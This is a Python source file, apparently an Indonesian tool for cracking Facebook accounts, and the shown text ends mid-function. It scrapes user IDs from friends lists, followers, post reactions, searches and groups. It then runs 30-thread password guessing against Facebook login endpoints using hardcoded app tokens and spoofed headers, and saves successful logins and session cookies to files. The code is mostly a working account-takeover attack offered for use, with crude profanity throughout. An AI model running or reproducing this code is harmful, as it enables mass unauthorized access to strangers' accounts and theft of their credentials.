#coding=utf-8

#Open Source Code Syarat? Subrek Channel Gua & Jangan Ganti Bot Follow! Cukup Tambahkan Bot Follow Sajah!

######################################################
#                                                    #
# Recode? Boleh, Yang Penting Follow Github Gua Ajg! #
#                                                    #
# Github: https://www.github.com/BiiDev              #
#                                                    #
# Created By Bii Dev, /.Bdbss, orbXD                 #
#                                                    #
# Tipe Python3                                       #
#                                                    #
# File Name: ryu.py                                  #
#                                                    #
# Mohon Hargai Author                                #
#                                                    #
######################################################


# Created Pada Tanggal 29/08/2021
# Please Don't remove my bot follow


import os,sys,re,json,random,requests,time,uuid,data
from time import sleep as waktu
from datetime import datetime
from shutil import rmtree as hapus
from concurrent.futures import ThreadPoolExecutor as Bool
from os import system as c
dina_kiye = datetime.now()
tgl = dina_kiye.strftime('%d')
bln = dina_kiye.strftime('%m')
thn = dina_kiye.strftime('%Y')
join = str(datetime.now().strftime('%d-%m-%Y'))
ip = requests.get("https://api.ipify.org").text
b='\033[1;94m'

i='\033[1;92m'

c='\033[1;96m'

m='\033[1;91m'

u='\033[1;95m'

k='\033[1;93m'

p='\033[1;97m'

h='\033[1;90m'

p = '\x1b[1;97m' # PUTIH

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH 

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

xo = '\033[1;41m' #Warna Backgorund

O = '\x1b[1;96m' # BIRU MUDA

put = '\033[1;37m' # PUTIH

N = '\x1b[0m'    # WARNA MATI
ok=0
cp=0
cot=0
live=[]
chek=[]
def restart():repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try: import requests as req
except ModuleNotFoundError: os.system("pip install requests");restart()
try: from bs4 import BeautifulSoup as parser
except ModuleNotFoundError: os.system("pip install bs4");restart()
 
ua_="NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
runtah=["moshi_moshi/__pycache__","aracans/__pycache__"]
try:
	hapus(runtah[0])
except:
	pass
try:
	hapus(runtah[1])
except:
	pass

def logo():
	os.system("clear")
	print(f"""
%s  _____                                         
 |  __ \    Rec • %s ZhuL %s
%s | |__) |  _   _   _   _  __  __  _   _    ___  
%s |  _  /  | | | | | | | | \ \/ / | | | |  / _ \ 
%s | | \ \  | |_| | | |_| |  >  <  | |_| | | (_) |
%s |_|  \_\  \__, |  \__,_| /_/\_\  \__, |  \___/ 
%s            __/ |                  __/ |        
%s           |___/                  |___/         """%(N,xo,N,N,N,N,N,N,N))
class about:
	def __init__(self,url):
		self.url=url
	def tentang(self):
		try:
			anjir=req.get(f"{self.url}/profile.php",cookies=kueh).text
		except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
			exit("%s [%s•%s•%s] Kesalahan Jaringan"%(put,k,m,put))
		if "mbasic_logout_button" not in anjir:
			try:os.remove("bukanmain/cookie");os.remove("bukanmain/token");os.remove("bukanmain/my_info")
			except:os.system("rm -rf bukanmain/cookie && rm -rf bukanmain/token && rm -rf bukanmain/my_info")
			exit("%s [%s•%s•%s] Cookie Mati, Login Ulang!"%(put,k,m,put))
		else:
			logo()
			print("%s~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"%(put))
			print(f"\033[0;96m\033[0;97m [\033[1;33m•\033[1;91m•%s] Your Name    : \033[1;32m{tentang.get('nama')} "%(put))
			print(f"\033[0;96m\033[0;97m [\033[1;33m•\033[1;91m•%s] Your ID      : \033[1;32m{tentang.get('uid')} "%(put))
			print(f"\033[0;96m\033[0;97m [\033[1;33m•\033[1;91m•%s] Your IP      : \033[1;32m{ip}"%(put))
			print(f"\033[0;96m\033[0;97m [\033[1;33m•\033[1;91m•%s] Expired      : \033[1;32m{exp}"%(put))
			print(f"\033[0;96m\033[0;97m [\033[1;33m•\033[1;91m•%s] Version      : \033[1;32m*Beta Test"%(put))
			print("%s~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"%(put))
			print(" [01] Crack ID From Friendlis/Public")
			print(" [02] Crack ID From Followers")
			print(" [03] Crack ID From Post")
			print(" [04] Crack ID From Username")
			print(" [05] Crack ID From Req Friends")
			print(" [06] Crack ID From Grub Facebook")
			print(" [07] Crack With Phone Number")
			print(" [99] Cek Result Crack")
			print(" [00] Exit (Remove Cookie)")
			print(f" %s"%(put))
 
class ngentod:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
		self.id=[]
	def folower(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',kontol)
			for softek in memek:
				if "&amp;refid=" in softek[0]:
					self.id.append(re.findall("id=(.*?)&",softek[0])[0]+"[login]"+softek[1])
				elif "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[login]"+softek[1])
				elif "?refid=" in softek[0]:
					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"[login]"+softek[1])
				else:
					self.id.append(softek[0]+"[login]"+softek[1])
				print(f"\r \033[1;37m[\033[1;33m•\033[1;91m•\033[1;37m] Sedang Mengumpulkan {len(self.id)} ID... ",end="")
			if "Lihat Selengkapnya" in kontol:
				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def babaturan(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[login]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[login]"+softek[1])
				print(f"\r \033[1;37m[\033[1;33m•\033[1;91m•\033[1;37m] Sedang Mengumpulkan {len(self.id)} ID... ",end="")
			if "Lihat selengkapnya" in kontol:
				self.babaturan(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def memekgrup(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
			
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[login]"+softek[1])
				else:
					self.id.append(softek[0]+"[login]"+softek[1])
				print(f"\r \033[1;37m[\033[1;33m•\033[1;91m•\033[1;37m] Sedang Mengumpulkan {len(self.id)} ID... ",end="")
			if "Lihat Selengkapnya" in kontol:
				self.memekgrup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			else:
				def geh(gey):
					a=req.get(gey,cookies=kueh).text
					b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"[login]"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"[login]"+c[1])
							print(f"\r \033[1;37m[\033[1;33m•\033[1;91m•\033[1;37m] Sedang Mengumpulkan {len(self.id)} ID... ",end="")
					if "Lihat Postingan Lainnya" in a:
						geh(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				geh(f"{self.url}/groups/"+re.search("id=(\\d*)",hencet).group(1))
		except:pass
	def teangan(self,hencet): #,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
			
			for softek in memek:
				if "profile.php?" in softek[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"[login]"+softek[2])
				else:
					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"[login]"+softek[2])
				print(f"\r \033[1;37m[\033[1;33m•\033[1;91m•\033[1;37m] Sedang Mengumpulkan {len(self.id)} ID... ",end="")
				#if len(self.id)==jum:
					#true=True
					#break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.teangan(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href")) #,jum)
		except:pass
	def flrencang(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"[login]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[login]"+softek[1])
				print(f"\r \033[1;37m[\033[1;33m•\033[1;91m•\033[1;37m] Sedang Mengumpulkan {len(self.id)} ID... ",end="")
			if "Lihat Teman Lain" in kontol:
				self.flrencang(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
		except:pass
	def menta(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[login]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[login]"+softek[1])
				print(f"\r \033[1;37m[\033[1;33m•\033[1;91m•\033[1;37m] Sedang Mengumpulkan {len(self.id)} ID... ",end="")
			if "Lihat selengkapnya" in kontol:
				self.menta(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def reactpost(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			if "Semua 0" in kontol:
				print("%s [%s•%s•%s] Tidak Ada Yang Menanggapi Postingan"%(put,k,m,put));waktu(3);self.menu()
			else:
				memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
				
				for softek in memek:
					if "profile.php?" in softek[0]:
						self.id.append(re.findall("id=(.*)",softek[0])[0]+"[login]"+softek[1])
					else:
						self.id.append(re.findall("/(.*)",softek[0])[0]+"[login]"+softek[1])
					print(f"\r \033[1;37m[\033[1;33m•\033[1;91m•\033[1;37m] Sedang Mengumpulkan {len(self.id)} ID... ",end="")
				if "Lihat Selengkapnya" in kontol:
					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass

	def menu(self):
		about(self.url).tentang()
		pilih=input("%s [%s•%s•%s] Choose: "%(put,k,m,put))
		if pilih in["1","01"]:
			print("\n%s [%s•%s•%s] Ketika 'me' Untuk Crack Daftar Teman Anda"%(put,k,m,put))
			kontol=input("%s [%s•%s•%s] ID Target: "%(put,k,m,put))
			if kontol in[""," "]:
				print(f"%s [%s•%s•%s] Di Larang Kosong"%(put,k,m,put));waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
			else:
				memek=f"{self.url}/{kontol}/friends"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Tidak Ada Teman Untuk Ditampilkan" in ajg:
					print(f"%s [%s•%s•%s] Daftar Teman Tidak Di Publikasikan"%(put,k,m,put));waktu(2);self.menu()
				elif "Halaman yang Anda minta tidak ditemukan." in ajg:
					print(f"%s [%s•%s•%s] ID Tidak Di Temukan, Mohon Coba Lagi!"%(put,k,m,put));waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print(f"%s [%s•%s•%s] Aktivitas Facebook Limit, Silahkan Beralih Akun"%(put,k,m,put));waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"%s [%s•%s•%s] ID Tidak Di Temukan"%(put,k,m,put));waktu(2);self.menu()
				else:
					#print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.flrencang(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("%s [%s•%s•%s] Kesalahan Jaringan"%(put,k,m,put))
		elif pilih in["2","02"]:
			print("\n%s [%s•%s•%s] Ketika 'me' Untuk Crack Followers Anda"%(put,k,m,put))
			kontol=input("%s [%s•%s•%s] ID Target: "%(put,k,m,put))
			if kontol in[""," "]:
				print(f"%s [%s•%s•%s] Di Larang Kosong"%(put,k,m,put));waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
			else:
				memek=f"{self.url}/{kontol}?v=followers"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman Tidak Ditemukan" in ajg:
					print(f"%s [%s•%s•%s] ID Tidak Di Temukan"%(put,k,m,put));waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("%s [%s•%s•%s] Aktivitas Facebook Limit, Silahkan Beralih Akun"%(put,k,m,put));waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"%s [%s•%s•%s] ID Tidak Di Temukan"%(put,k,m,put));waktu(2);self.menu()
				else:
					#print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					print("\n%s [%s•%s•%s] Ketikan CRTL+Z Untuk Berhenti!"%(put,k,m,put))
					self.folower(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("%s [%s•%s•%s] Kesalahan Koneksi"%(put,k,m,put))
		elif pilih in["3","03"]:
			print("\n%s [%s•%s•%s] Masukan ID Postingan"%(put,k,m,put))
			kontol=input("%s [%s•%s•%s] ID Post: "%(put,k,m,put))
			if kontol in[""," "]:
				print("%s [%s•%s•%s] Di Larang Kosong!"%(put,k,m,put));waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/{kontol}"
			elif "m.facebook.com" in kontol:
				memek=kontol.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in kontol:
				memek=kontol.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in kontol:
				memek=kontol.replace("free.facebook.com","mbasic.facebook.com")
			else:
				memek=kontol
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in ajg:
					print(f"%s [%s•%s•%s] Post Tidak Di Temukan!"%(put,k,m,put));waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("%s [%s•%s•%s] Aktivitas Facebook Limit, Silahkan Beralih Akun"%(put,k,m,put));waktu(2);self.menu()
				else:
					try:
						kuntul=re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',ajg)[0].replace(";","&")
						self.reactpost(f"{self.url}/ufi/reaction/profile/browser/{kuntul}")
					except IndexError:
						print("%s [%s•%s•%s] Error, Silahkan Masukkan ID Post Dengan Benar"%(put,k,m,put));waktu(1);self.menu()
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("%s [%s•%s•%s] Kesalahan Koneksi"%(put,k,m,put))
			except req.exceptions.MissingSchema:
				print("%s [%s•%s•%s] Error, Silahkan Masukkan ID Post Dengan Benar"%(put,k,m,put));waktu(3);self.menu()
		elif pilih in["4","04"]:
			while True:
				print("\n%s [%s•%s•%s] Ex Username: cinta.xnxx"%(put,k,m,put))
				kontol=input("%s [%s•%s•%s] Username : "%(put,k,m,put))
				if kontol in[""," "]:
					print("%s [%s•%s•%s] Di Larang Kosong"%(put,k,m,put))
				else:
					try:
						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
						if "Maaf, kami tidak menemukan" in ajg:
							print(f"%s [%s•%s•%s] Maaf Username Tidak Di Temukan"%(put,k,m,put));waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("%s [%s•%s•%s] Aktivitas Facebook Limit, Silahkan Beralih Akun"%(put,k,m,put));waktu(2);self.menu()
						else:
							#jumlah="999999999999"
							#if "999999999999" in (jumlah):
								#jumlah-=1
							#if jumlah<9999999999991:
								#
							self.teangan(f"{self.url}/search/people/?q={kontol}");break #,jumlah);break
							#else: exit("[!] Max 5000 User")
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("%s [%s•%s•%s] Kesalahan Koneksi"%(put,k,m,put))
					except ValueError:
						print("%s [%s•%s•%s] Isi Yang Bener Kontol"%(put,k,m,put))
		elif pilih in["5","05"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Permintaan" in ajg:
					print("%s [%s•%s•%s] Permintaan Pertemanan Not Found"%(put,k,m,put));waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("%s [%s•%s•%s] Aktivitas Facebook Limit, Silahkan Beralih Akun"%(put,k,m,put));waktu(2);self.menu()
				else:
					self.menta(f"{self.url}/friends/center/requests/#friends_center_main")
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit("%s [%s•%s•%s] Kesalahan Koneksi"%(put,k,m,put))
		elif pilih=="6" or pilih =="06":
			while True:
				print("\n%s [%s•%s•%s] Masukan ID Grub"%(put,k,m,put))
				kontol=input("%s [%s•%s•%s] ID Grub Target : "%(put,k,m,put))
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg:
							print("\n%s [%s•%s•%s] Maaf Grub Tidak Di Temukan"%(put,k,m,put));waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("\n%s [%s•%s•%s] Aktivitas Facebook Limit, Silahkan Beralih Akun"%(put,k,m,put));waktu(2);self.menu()
						elif "Konten Tidak Ditemukan" in ajg:
							print(f"\n%s [%s•%s•%s] Grub Dengan ID {kontol} Tidak Di Temukan!"%(put,k,m,put));waktu(2);self.menu()
						else:
							print("\n%s [%s•%s•%s] Nama Grub : "%(put,k,m,put)+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
							self.memekgrup(f"{self.url}/browse/group/members/?id={kontol}");break
					except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
						exit("[!] Kesalahan Pada Koneksi")
		elif pilih=="7" or pilih=="07":
			exit(data.random_numbers())
		elif pilih=="99":
			self.hasil()
		elif pilih in["0","00"]:
			exit("%s [%s•%s•%s] Thanks For Use My Script:)\n [%s•%s•%s] Ketikan %srm -rf bukanmain%s Untuk Logout Dari Tools"%(put,k,m,put,k,m,put,c,put))
		elif pilih in[""," "]:
			print("%s [%s•%s•%s] Di Larang Kosong"%(put,k,m,put));waktu(0.8);self.menu()
		else:
			print("%s [%s•%s•%s] Pilihan Tidak Ada"%(put,k,m,put));self.menu()
		if len(self.id)!=0:
			print("")
			self.askk()
		else:
			print("%s [%s•%s•%s] Gagal Mengambil ID, Mohon Coba Lagi"%(put,k,m,put));waktu(1.5);self.menu()
	def hasil(self):
		print("%s [%s•%s•%s] Result OK/CP\n"%(put,k,m,put))
		print("%s [%s•%s•%s] Result OK\n"%(put,k,m,put))
		os.system('cat ok.txt')
		print("\n%s [%s•%s•%s] Result CP\n"%(put,k,m,put))
		os.system('cat cp.txt')
		os.sys.exit()
	def askk(self):
		print(f"\n%s [%s•%s•%s] Total ID -> {len(self.id)}"%(put,k,m,put))
		njir=input("%s [%s•%s•%s] Crack With Pass Default/Manual? [d/m] "%(put,k,m,put))
		if njir in(""," "):
			print("%s [%s•%s•%s] Di Larang Kosong"%(put,k,m,put));self.askk()
		elif njir in("m","M"):
			print("%s [%s•%s•%s] Ex Pass: anjing, kontol, sayang, bangsat, bajingan, indonesia\n"%(put,k,m,put))
			while True:
				pwek=input("%s [%s•%s•%s] Pass List: "%(put,k,m,put))
				if pwek in(""," "):
					print("%s [%s•%s•%s] Di Larang Kosong"%(put,k,m,put))
				elif len(pwek)<=5:
					print("%s [%s•%s•%s] Pass Minimal 6 Karakter"%(put,k,m,put))
				else:
					def xhh(xss=None):
						pilih=input("%s [%s•%s•%s] Choose: "%(put,k,m,put))
						if pilih in(""," "):
							print("%s [%s•%s•%s] Di Larang Kosong"%(put,k,m,put));xhh()
						elif pilih in("1","01"):
							print("\n%s [%s•%s•%s] Hasil [OK] Tersimpan Di : ok.txt\n%s [%s•%s•%s] Hasil [CP] Tersimpan Di : cp.txt\n%s [%s•%s•%s] Mode Pesawat 5/10 Detik Jika Tidak Ada Hasil\n"%(put,k,m,put,put,k,m,put,put,k,m,put))
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[login]")[0]
										tokai.submit(self.crackapi,xi,xss)
									except: pass
							hasil(live,chek)
						elif pilih in("2","02"):
							print("\n%s [%s•%s•%s] Hasil [OK] Tersimpan Di : ok.txt\n%s [%s•%s•%s] Hasil [CP] Tersimpan Di : cp.txt\n%s [%s•%s•%s] Mode Pesawat 5/10 Detik Jika Tidak Ada Hasil\n"%(put,k,m,put,put,k,m,put,put,k,m,put))
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[login]")[0]
										tokai.submit(self.modol,xi,xss,"https://mbasic.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("3","03"):
							print("\n%s [%s•%s•%s] Hasil [OK] Tersimpan Di : ok.txt\n%s [%s•%s•%s] Hasil [CP] Tersimpan Di : cp.txt\n%s [%s•%s•%s] Mode Pesawat 5/10 Detik Jika Tidak Ada Hasil\n"%(put,k,m,put,put,k,m,put,put,k,m,put))
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[login]")[0]
										tokai.submit(self.modol,xi,xss,"https://free.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("4","04"):
							print("\n%s [%s•%s•%s] Hasil [OK] Tersimpan Di : ok.txt\n%s [%s•%s•%s] Hasil [CP] Tersimpan Di : cp.txt\n%s [%s•%s•%s] Mode Pesawat 5/10 Detik Jika Tidak Ada Hasil\n"%(put,k,m,put,put,k,m,put,put,k,m,put))
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[login]")[0]
										tokai.submit(self.graph,xi,xss)
									except: pass
							hasil(live,chek)
						else:
							print("%s [%s•%s•%s] Isi Yang Bener Ngentod"%(put,k,m,put));xhh()
					print(f"%s [%s•%s•%s] Crack With Pass Manual : {pwek}\n"%(put,k,m,put)) #.format(M,pwek)
					print("\n%s [%s•%s•%s] Select Methode Crack"%(put,k,m,put))
					print(" [01] Metode Api fb    (fast crack)")
					print(" [02] Metode M fb      (lumayan fast crack)")
					print(" [03] Metode Mbasic fb (slow crack)")
					print(" [04] Metode Touch fb  (slow crack)")
					print(" [05] Metode Free fb   (slow crack)\n")
					xhh(pwek.split(","))
					break
		elif njir in("d","D"):
			print("\n%s [%s•%s•%s] Select Methode Crack"%(put,k,m,put))
			print(" [01] Metode API fb    (fast crack)")
			print(" [02] Metode M fb      (lumayan fast crack)")
			print(" [03] Metode Mbasic fb (slow crack)")
			print(" [04] Metode Touch fb  (slow crack)")
			print(" [05] Metode Free fb   (slow crack)")
			self.ngontol()
		else:
			print("%s [%s•%s•%s] Isi Yang Bener Ngntod"%(put,k,m,put));self.askk()
	def crackapi1(self,user,ox):
		global ok,cp,cot
		for pw in ox:
			if user in open("ok.txt","r").read() or user in open("cp.txt","r").read():
				break
			else:
				ses=req.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param)
				if "session_key" in send.text and "EAAA" in send.text:
					ok+=1
					try:
						birthday = ses.get(f'https://graph.facebook.com/me?access_token={send.text["access_token"]}').text['birthday'].replace('/', '-')
					except: pass
					print(f"\r\x1b[1;32m * --> {uid} • {pw}\x1b[0m\n",end="")
					open("ok.txt","a").write(f"{uid}|{pw}\n")
					live.append(f"{uid}{pw}")
					break 
				elif "www.facebook.com" in send.json()["error_msg"]:
					cp+=1
					print(f"\r\x1b[1;33m * --> {uid} • {pw}\x1b[0m\n",end="")
					open("cp.txt","a").write(f"{user}|{pw}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r\033[1;37m [Crack] {str(cot)}/{len(self.id)} Ok:-{str(ok)} Cp:-{str(cp)}",end="")
	def crackapi(self,user,ox):
		global ok,cp,cot
		for pw in ox:
			if user in open("ok.txt","r").read() or user in open("cp.txt","r").read():
				break
			else:
				ses=req.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param)
				if "session_key" in send.text and "EAAA" in send.text:
					ok+=1
					try:
						birthday = ses.get(f'https://graph.facebook.com/me?access_token={send.text["access_token"]}').text['birthday'].replace('/', '-')
					except: pass
					print(f"\r\x1b[1;32m * --> {user} • {pw}\x1b[0m\n",end="")
					open("ok.txt","a").write(f"{user}|{pw}\n")
					live.append(f"{user}{pw}")
					break
				elif "www.facebook.com" in send.json()["error_msg"]:
					cp+=1
					print(f"\r\x1b[1;33m * --> {user} • {pw}\x1b[0m\n",end="")
					open("cp.txt","a").write(f"{user}|{pw}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r\033[1;37m [Crack] {str(cot)}/{len(self.id)} Ok:-{str(ok)} Cp:-{str(cp)}",end="")
	def modol(self,user,ox,beol,**kwargs):
		global ok,cp,cot
		for pw in ox:
			if user in open("ok.txt","r").read() or user in open("cp.txt","r").read(): break
			else:
				ses=req.Session()
				a=ses.get(f"{beol}/login/?next&ref=dbl&refid=8").text
				b=parser(a,"html.parser")
				for x in b.find_all("input"):
					if x.get("name")==None or "_fb_noscript" in x.get("name") or "sign_up" in x.get("name"):continue
					else:kwargs.update({x.get("name"):x.get("value")})
				kwargs.update({"email":user,"pass":pw})
				tol=beol+b.find("form",method="post").get("action")
				if "m.facebook.com" in beol:ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"x-fb-lsd":kwargs.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":ua_,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","origin":beol,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
				else:
					if "mbasic.facebook.com" in beol:anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
					else:anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
					ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":anjg,"origin":beol,"user-agent":ua_,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				ses.post(tol,data=kwargs,allow_redirects=False)
				kuke=ses.cookies.get_dict()
				if "c_user" in kuke:
					ok+=1
					try:
						birthday = ses.get('https://graph.facebook.com/me?access_token='+ses.post("https://graph.facebook.com/auth/login",data={"locale":"id_ID","format":"json","email":user,"password":pw,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1"}).text['access_token']).text['birthday'].replace('/','-')
					except: pass
					kuki=f"c_user={kuke.get('c_user')};fr={kuke.get('fr')};xs={kuke.get('xs')}"
					print(f"\r\x1b[1;32m * --> {kuke.get('c_user')} • {pw} • {kuki}\x1b[0m\n",end="")
					open("ok.txt","a").write(f"{kuke.get('c_user')}|{pw}|{kuki}\n")
					live.append(f"{kuke.get('c_user')}{pw}{kuki}")
					break
				elif "checkpoint" in kuke:
					cp+=1
					try:uid=re.search("3A(\\d*)",kuke.get("checkpoint")).group(1)
					except:uid=user
					print(f"\r\x1b[1;33m * --> {user} • {pw}\x1b[0m\n",end="")
					open("cp.txt","a").write(f"{user}|{pw}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r\033[1;37m [Crack] {str(cot)}/{len(self.id)} Ok:-{str(ok)} Cp:-{str(cp)}",end="")
	def graph(self,user,ox):
		global ok,cp,cot
		for pw in ox:
			if user in open("cp.txt","r").read() or user in open("cp.txt","r").read(): break
			else:
				ses=req.Session()
